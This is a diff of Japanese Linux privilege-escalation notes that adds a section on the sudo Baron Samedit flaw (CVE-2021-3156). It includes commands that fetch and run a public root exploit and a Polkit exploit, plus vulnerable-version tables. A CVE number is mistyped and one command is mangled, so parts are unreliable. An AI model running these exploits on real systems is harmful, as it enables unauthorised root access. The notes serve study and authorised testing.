@@ -561,7 +561,7 @@ $$USNの修正済みバージョン情報$$
 | [[#Get-Rekt BPF (CVE-2017-16995)]]                                  | ・Debian 9  <br>・Ubuntu 14.04–16.04  <br>・Mint 17–18  <br>・Fedora 25–27         | 4.4.0 – 4.14.10                           | カーネル依存型。                                                                                     |
 | [[#Dirty Pipe (CVE-2022-0847)]]                                     | ・Ubuntu 20.04–21.04  <br>・Debian 11  <br>・RHEL 8.0–8.4  <br>・Fedora 35         | 5.8.x以上 (修正済: 5.16.11, 5.15.25, 5.10.102) | カーネル依存型。ターゲットカーネルが修正済みか確認。                                                                   |
 | [Polkit (CVE-2021-2560)](https://www.exploit-db.com/exploits/50011) | ・Ubuntu 20.04 / 20.10  <br>・Debian 11  <br>・RHEL 8.x / Fedora 33               | すべてのカーネル                                  | 2021年頃の比較的新しい環境が対象。  <br>D-Busの応答を切断するタイミングを利用した論理バグ。  <br>GUI環境がなくても成立する。                   |
-| sudo Baron Samedit (CVE-2021-3156)                                  | ほぼ全ディストロ（sudo 使用環境）                                                            | すべてのカーネル                                  | カーネル非依存（sudo のバージョン依存）。  <br>*sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1* が対象。  <br>ヒープオーバーフロー。 |
+| [[#sudo Baron Samedit(CVE-2021-3156)]]                              | ほぼ全ディストロ（sudo 使用環境）                                                            | すべてのカーネル                                  | カーネル非依存（sudo のバージョン依存）。  <br>*sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1* が対象。  <br>ヒープオーバーフロー。 |
 
 
 ---
@@ -729,6 +729,106 @@ searchsploit -m 50011
 ./50011.sh
 ```
 - 失敗すると、`[*] Attempting to create account`でハングする
+
+### sudo Baron Samedit (CVE-2021-3156)
+
+https://github.com/worawit/CVE-2021-3156
+
+1. sudo のバージョン確認
+```sh
+sudo --version
+```
+- → 出力の先頭行のバージョンを確認し、脆弱なバージョンか判定    
+	- 1.8.2 ～ 1.8.31p2、1.9.0 ～ 1.9.5p1`
+
+※ ディストロによってはバックポート修正されているため  
+パッケージのリビジョンも確認する
+
+#### Debian / Ubuntu の場合
+
+`dpkg -l sudo`
+
+#### RHEL / CentOS / Fedora の場合
+
+`rpm -qa | grep sudo`
+
+→ 出力を **vulnerable / fixed バージョン表** と照合
+
+---
+
+4. exploit の実行
+    
+
+`curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py -o exploit_nss.py python3 exploit_nss.py`
+
+成功すると：
+
+`# id uid=0(root) gid=0(root)`
+
+---
+
+## 特徴 / 成功条件
+
+- sudo 権限不要
+    
+- パスワード不要
+    
+- ローカルユーザでOK
+    
+- SUID sudo があれば成立（通常は必ず付いている）
+    
+
+SUID 確認：
+
+`ls -l /usr/bin/sudo`
+
+`-rwsr-xr-x`
+
+---
+
+## 失敗する主な原因
+
+- 修正済み sudo
+    
+- exploit と glibc / ディストロの相性
+    
+- Python 不在（別 exploit を使用）
+    
+
+---
+
+## ディストロごとの vulnerable / fixed バージョン
+
+🔗参照：  
+https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt
+
+### Ubuntu
+
+|Ubuntu version|Vulnerable|Fixed|
+|---|---|---|
+|16.04 LTS|1.8.16 ～ 1.8.31p2|1.8.16-0ubuntu1.10|
+|18.04 LTS|1.8.21p2 ～ 1.8.31p2|1.8.21p2-3ubuntu1.4|
+|20.04 LTS|1.8.31|1.8.31-1ubuntu1.2|
+
+---
+
+### Debian
+
+|Debian version|Vulnerable|Fixed|
+|---|---|---|
+|Stretch|vulnerable|1.8.19p1-2.1+deb9u3|
+|Buster|vulnerable|1.8.27-1+deb10u3|
+|Bullseye|vulnerable|1.9.5p2-3|
+
+---
+
+### RHEL / CentOS
+
+| Version | Fixed                    |
+| ------- | ------------------------ |
+| 6       | sudo-1.8.6p7-29.el6_10.3 |
+| 7       | sudo-1.8.23-10.el7_9.1   |
+| 8       | sudo-1.8.29-6.el8_3.1    |
 
 ---
 ---
